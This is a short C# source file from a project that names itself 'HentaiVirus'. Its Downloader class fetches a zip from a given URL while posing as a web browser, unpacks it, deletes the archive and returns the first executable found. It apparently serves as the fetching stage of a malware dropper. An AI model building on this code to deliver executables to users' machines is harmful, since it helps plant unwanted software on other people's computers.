using System.IO;
using System.IO.Compression;
using System.Net.Http;
using System.Threading.Tasks;

namespace HentaiVirus.Core
{
    public class Downloader
    {
        private static readonly HttpClient _httpClient = new()
        {
            DefaultRequestHeaders = { { "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" } }
        };

        public async Task<string> DownloadAndExtractAsync(string url, string targetFolder)
        {
            string zipPath = Path.Combine(targetFolder, "package.zip");

            var responseBytes = await _httpClient.GetByteArrayAsync(url);
            await File.WriteAllBytesAsync(zipPath, responseBytes);

            ZipFile.ExtractToDirectory(zipPath, targetFolder, true);

            if (File.Exists(zipPath))
            {
                File.Delete(zipPath);
            }

            string[] files = Directory.GetFiles(targetFolder, "*.exe", SearchOption.AllDirectories);

            return files.Length > 0 ? files[0] : string.Empty;
        }
    }
}